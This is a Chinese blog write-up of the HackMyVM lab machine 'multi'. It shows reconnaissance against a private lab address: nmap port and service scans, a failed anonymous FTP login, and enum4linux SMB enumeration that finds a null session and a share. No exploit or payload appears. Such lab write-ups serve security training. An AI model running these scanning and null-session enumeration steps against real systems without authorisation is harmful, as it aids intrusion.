<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>hackmyvm_multi | myift</title><meta name="author" content="dgh"><meta name="copyright" content="dgh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="先定位靶机 看一下端口服务 ┌──(root㉿kali)-[&#x2F;myift&#x2F;bachang&#x2F;hvm&#x2F;mutli]└─# cat ports.txt # Nmap 7.94SVN scan initiated Tue Dec  9 06:46:22 2025 as: &#x2F;usr&#x2F;lib&#x2F;nmap&#x2F;nmap -p- --min-rate 10000 -oN ports.txt 192.168.56.11">
<meta property="og:type" content="article">
<meta property="og:title" content="hackmyvm_multi">
<meta property="og:url" content="http://example.com/2025/12/10/hackmyvm-multi/index.html">
<meta property="og:site_name" content="myift">
<meta property="og:description" content="先定位靶机 看一下端口服务 ┌──(root㉿kali)-[&#x2F;myift&#x2F;bachang&#x2F;hvm&#x2F;mutli]└─# cat ports.txt # Nmap 7.94SVN scan initiated Tue Dec  9 06:46:22 2025 as: &#x2F;usr&#x2F;lib&#x2F;nmap&#x2F;nmap -p- --min-rate 10000 -oN ports.txt 192.168.56.11">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/image/png.png">
<meta property="article:published_time" content="2025-12-10T13:39:00.000Z">
<meta property="article:modified_time" content="2025-12-10T13:39:39.801Z">
<meta property="article:author" content="dgh">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/image/png.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "hackmyvm_multi",
  "url": "http://example.com/2025/12/10/hackmyvm-multi/",
  "image": "http://example.com/image/png.png",
  "datePublished": "2025-12-10T13:39:00.000Z",
  "dateModified": "2025-12-10T13:39:39.801Z",
  "author": [
    {
      "@type": "Person",
      "name": "dgh",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/12/10/hackmyvm-multi/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'hackmyvm_multi',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/image/png.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/image/png1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">myift</span></a><a class="nav-page-title" href="/"><span class="site-name">hackmyvm_multi</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">hackmyvm_multi</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-10T13:39:00.000Z" title="发表于 2025-12-10 21:39:00">2025-12-10</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-10T13:39:39.801Z" title="更新于 2025-12-10 21:39:39">2025-12-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><img src="/../imgs/$%7Bfiilename%7D/image-20251209193711649.png" alt="image-20251209193711649"></p>
<h3 id="先定位靶机"><a href="#先定位靶机" class="headerlink" title="先定位靶机"></a>先定位靶机</h3><p><img src="/../imgs/$%7Bfiilename%7D/image-20251209194851558.png" alt="image-20251209194851558"></p>
<p>看一下端口服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# cat ports.txt </span><br><span class="line"># Nmap 7.94SVN scan initiated Tue Dec  9 06:46:22 2025 as: /usr/lib/nmap/nmap -p- --min-rate 10000 -oN ports.txt 192.168.56.111</span><br><span class="line">Nmap scan report for 192.168.56.111</span><br><span class="line">Host is up (0.00040s latency).</span><br><span class="line">Not shown: 65521 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">23/tcp    open  telnet</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">28080/tcp open  thor-engine</span><br><span class="line">33273/tcp open  unknown</span><br><span class="line">34863/tcp open  unknown</span><br><span class="line">56189/tcp open  unknown</span><br><span class="line">60977/tcp open  unknown</span><br><span class="line">MAC Address: 08:00:27:7C:83:9F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line"># Nmap done at Tue Dec  9 06:46:24 2025 -- 1 IP address (1 host up) scanned in 2.75 seconds</span><br><span class="line">                                                                                                      </span><br></pre></td></tr></table></figure>

<h3 id="看一下具体服务"><a href="#看一下具体服务" class="headerlink" title="看一下具体服务"></a>看一下具体服务</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# nmap -sCV -p- --min-rate 10000 192.168.56.111</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-09 06:48 EST</span><br><span class="line">Nmap scan report for 192.168.56.111</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line">Not shown: 65521 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">21/tcp    open  ftp          vsftpd 3.0.3</span><br><span class="line">| ssl-cert: Subject: commonName=ftp-server/organizationName=MyOrganization/stateOrProvinceName=Beijing/countryName=CN</span><br><span class="line">| Not valid before: 2025-07-17T11:34:00</span><br><span class="line">|_Not valid after:  2035-07-15T11:34:00</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">22/tcp    open  ssh          OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span><br><span class="line">|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span><br><span class="line">|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span><br><span class="line">23/tcp    open  telnet       Linux telnetd</span><br><span class="line">80/tcp    open  http         Apache httpd 2.4.62 ((Debian))</span><br><span class="line">|_http-title: Apache2 Debian Default Page: It works</span><br><span class="line">|_http-server-header: Apache/2.4.62 (Debian)</span><br><span class="line">111/tcp   open  rpcbind      2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3           2049/udp   nfs</span><br><span class="line">|   100003  3           2049/udp6  nfs</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      37409/udp6  mountd</span><br><span class="line">|   100005  1,2,3      40623/tcp6  mountd</span><br><span class="line">|   100005  1,2,3      53305/udp   mountd</span><br><span class="line">|   100005  1,2,3      56189/tcp   mountd</span><br><span class="line">|   100021  1,3,4      33273/tcp   nlockmgr</span><br><span class="line">|   100021  1,3,4      37048/udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      37211/tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      51459/udp   nlockmgr</span><br><span class="line">|   100227  3           2049/tcp   nfs_acl</span><br><span class="line">|   100227  3           2049/tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049/udp   nfs_acl</span><br><span class="line">|_  100227  3           2049/udp6  nfs_acl</span><br><span class="line">139/tcp   open  netbios-ssn  Samba smbd 4.6.2</span><br><span class="line">445/tcp   open  netbios-ssn  Samba smbd 4.6.2</span><br><span class="line">2049/tcp  open  nfs          3-4 (RPC #100003)</span><br><span class="line">3306/tcp  open  mysql        MariaDB (unauthorized)</span><br><span class="line">28080/tcp open  thor-engine?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/3.1.3 Python/3.9.2</span><br><span class="line">|     Date: Tue, 09 Dec 2025 11:48:28 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Content-Length: 586</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!doctype html&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;title&gt;Admin Panel&lt;/title&gt;</span><br><span class="line">|     &lt;style&gt;</span><br><span class="line">|     body &#123; font-family: Arial, sans-serif; margin: 20px; &#125;</span><br><span class="line">|     table &#123; border-collapse: collapse; width: 100%; &#125;</span><br><span class="line">|     border: 1px solid #ddd; padding: 8px; text-align: left; &#125;</span><br><span class="line">|     background-color: #f2f2f2; &#125;</span><br><span class="line">|     .error &#123; color: red; &#125;</span><br><span class="line">|     &lt;/style&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h2&gt;Welcome&lt;/h2&gt;</span><br><span class="line">|     &lt;form method=&quot;POST&quot; action=&quot;/&quot;&gt;</span><br><span class="line">|     Username: &lt;input name=&quot;username&quot; required&gt;</span><br><span class="line">|     &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;</span><br><span class="line">|     &lt;/form&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Server: Werkzeug/3.1.3 Python/3.9.2</span><br><span class="line">|     Date: Tue, 09 Dec 2025 11:48:28 GMT</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Allow: OPTIONS, POST, HEAD, GET</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Connection: close</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;</span><br><span class="line">|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;head&gt;</span><br><span class="line">|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (&#x27;RTSP/1.0&#x27;).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">33273/tcp open  nlockmgr     1-4 (RPC #100021)</span><br><span class="line">34863/tcp open  mountd       1-3 (RPC #100005)</span><br><span class="line">56189/tcp open  mountd       1-3 (RPC #100005)</span><br><span class="line">60977/tcp open  mountd       1-3 (RPC #100005)</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port28080-TCP:V=7.94SVN%I=7%D=12/9%Time=69380C8E%P=x86_64-pc-linux-gnu%</span><br><span class="line">SF:r(GetRequest,2F7,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3</span><br><span class="line">SF:\x20Python/3\.9\.2\r\nDate:\x20Tue,\x2009\x20Dec\x202025\x2011:48:28\x2</span><br><span class="line">SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:</span><br><span class="line">SF:\x20586\r\nConnection:\x20close\r\n\r\n\n&lt;!doctype\x20html&gt;\n&lt;html&gt;\n&lt;h</span><br><span class="line">SF:ead&gt;\n\x20\x20\x20\x20&lt;title&gt;Admin\x20Panel&lt;/title&gt;\n\x20\x20\x20\x20&lt;s</span><br><span class="line">SF:tyle&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20body\x20&#123;\x20font-family:\x20Ari</span><br><span class="line">SF:al,\x20sans-serif;\x20margin:\x2020px;\x20&#125;\n\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20table\x20&#123;\x20border-collapse:\x20collapse;\x20width:\x20100%;\x2</span><br><span class="line">SF:0&#125;\n\x20\x20\x20\x20\x20\x20\x20\x20th,\x20td\x20&#123;\x20border:\x201px\x2</span><br><span class="line">SF:0solid\x20#ddd;\x20padding:\x208px;\x20text-align:\x20left;\x20&#125;\n\x20\</span><br><span class="line">SF:x20\x20\x20\x20\x20\x20\x20th\x20&#123;\x20background-color:\x20#f2f2f2;\x20</span><br><span class="line">SF:&#125;\n\x20\x20\x20\x20\x20\x20\x20\x20\.error\x20&#123;\x20color:\x20red;\x20&#125;\</span><br><span class="line">SF:n\x20\x20\x20\x20&lt;/style&gt;\n&lt;/head&gt;\n&lt;body&gt;\n\x20\x20\x20\x20&lt;h2&gt;Welcome</span><br><span class="line">SF:&lt;/h2&gt;\n\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;form\x20metho</span><br><span class="line">SF:d=\&quot;POST\&quot;\x20action=\&quot;/\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x</span><br><span class="line">SF:20\x20Username:\x20&lt;input\x20name=\&quot;username\&quot;\x20required&gt;\n\x20\x20\x</span><br><span class="line">SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;input\x20type=\&quot;submit\&quot;\x20valu</span><br><span class="line">SF:e=\&quot;Login\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;/form&gt;\n\x20\x20\x20\x20</span><br><span class="line">SF:\n\x20\x20\x20\x20\n\x20\x20\x20\x20\n&lt;/body&gt;\n&lt;/html&gt;&quot;)%r(HTTPOptions,</span><br><span class="line">SF:CC,&quot;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20Python/3\.</span><br><span class="line">SF:9\.2\r\nDate:\x20Tue,\x2009\x20Dec\x202025\x2011:48:28\x20GMT\r\nConten</span><br><span class="line">SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20POST,\x</span><br><span class="line">SF:20HEAD,\x20GET\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n&quot;</span><br><span class="line">SF:)%r(RTSPRequest,1F4,&quot;&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HT</span><br><span class="line">SF:ML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\x20\x20\&quot;http://www\.w3\.or</span><br><span class="line">SF:g/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;t</span><br><span class="line">SF:ext/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error</span><br><span class="line">SF:\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n</span><br><span class="line">SF:\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x2</span><br><span class="line">SF:0\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x20400&lt;/p&gt;\n\x20\x20\x20\x20\x20</span><br><span class="line">SF:\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x20version\x20\(&#x27;RTSP/1\.0&#x27;\)</span><br><span class="line">SF:\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code\x20explanation</span><br><span class="line">SF::\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20request\x20syntax\x20or\x20</span><br><span class="line">SF:unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;);</span><br><span class="line">MAC Address: 08:00:27:7C:83:9F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2025-12-09T11:49:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3:1:1: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">|_nbstat: NetBIOS name: MULTI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_clock-skew: -3s</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 98.69 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ftp的版本挺高的看一下匿名登陆就行"><a href="#ftp的版本挺高的看一下匿名登陆就行" class="headerlink" title="ftp的版本挺高的看一下匿名登陆就行"></a>ftp的版本挺高的看一下匿名登陆就行</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# ftp 192.168.56.111</span><br><span class="line">Connected to 192.168.56.111.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.111:root): anonymous</span><br><span class="line">530 Permission denied.</span><br><span class="line">ftp: Login failed</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<h4 id="80web端口"><a href="#80web端口" class="headerlink" title="80web端口"></a>80web端口</h4><p><img src="/../imgs/$%7Bfiilename%7D/image-20251209201732643.png" alt="image-20251209201732643"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209201811163.png" alt="image-20251209201811163"></p>
<h4 id="端口-445-SMB"><a href="#端口-445-SMB" class="headerlink" title="端口 445 (SMB)"></a>端口 445 (SMB)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# enum4linux -a 192.168.56.111</span><br><span class="line">Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Dec  9 07:35:23 2025</span><br><span class="line"></span><br><span class="line"> =========================================( Target Information )=========================================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">Target ........... 192.168.56.111                                                                                                                                                                                 </span><br><span class="line">RID Range ........ 500-550,1000-1050</span><br><span class="line">Username ......... &#x27;&#x27;</span><br><span class="line">Password ......... &#x27;&#x27;</span><br><span class="line">Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ===========================( Enumerating Workgroup/Domain on 192.168.56.111 )===========================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+] Got domain/workgroup name: SECUREGROUP                                                                                                                                                                        </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line"> ===============================( Nbtstat Information for 192.168.56.111 )===============================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">Looking up status of 192.168.56.111                                                                                                                                                                               </span><br><span class="line">        MULTI           &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service</span><br><span class="line">        MULTI           &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service</span><br><span class="line">        MULTI           &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service</span><br><span class="line">        ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        SECUREGROUP     &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name</span><br><span class="line">        SECUREGROUP     &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser</span><br><span class="line">        SECUREGROUP     &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections</span><br><span class="line"></span><br><span class="line">        MAC Address = 00-00-00-00-00-00</span><br><span class="line"></span><br><span class="line"> ==================================( Session Check on 192.168.56.111 )==================================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+] Server 192.168.56.111 allows sessions using username &#x27;&#x27;, password &#x27;&#x27;                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line"> ===============================( Getting domain SID for 192.168.56.111 )===============================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">Domain Name: SECUREGROUP                                                                                                                                                                                          </span><br><span class="line">Domain Sid: (NULL SID)</span><br><span class="line"></span><br><span class="line">[+] Can&#x27;t determine if host is part of domain or part of a workgroup                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line"> ==================================( OS information on 192.168.56.111 )==================================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[E] Can&#x27;t get OS info with smbclient                                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+] Got OS info for 192.168.56.111 from srvinfo:                                                                                                                                                                  </span><br><span class="line">        MULTI          Wk Sv PrQ Unx NT SNT Secure Samba Server                                                                                                                                                   </span><br><span class="line">        platform_id     :       500</span><br><span class="line">        os version      :       6.1</span><br><span class="line">        server type     :       0x809a03</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================( Users on 192.168.56.111 )======================================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                                                                           </span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.</span><br><span class="line"></span><br><span class="line">Use of uninitialized value $users in print at ./enum4linux.pl line 986.</span><br><span class="line">Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.</span><br><span class="line"></span><br><span class="line"> ================================( Share Enumeration on 192.168.56.111 )================================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                                                                                                             </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        secure_share    Disk      </span><br><span class="line">        IPC$            IPC       IPC Service (Secure Samba Server)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line">Protocol negotiation to server 192.168.56.111 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line"></span><br><span class="line">[+] Attempting to map shares on 192.168.56.111                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">//192.168.56.111/secure_share   Mapping: OK Listing: OK Writing: N/A                                                                                                                                              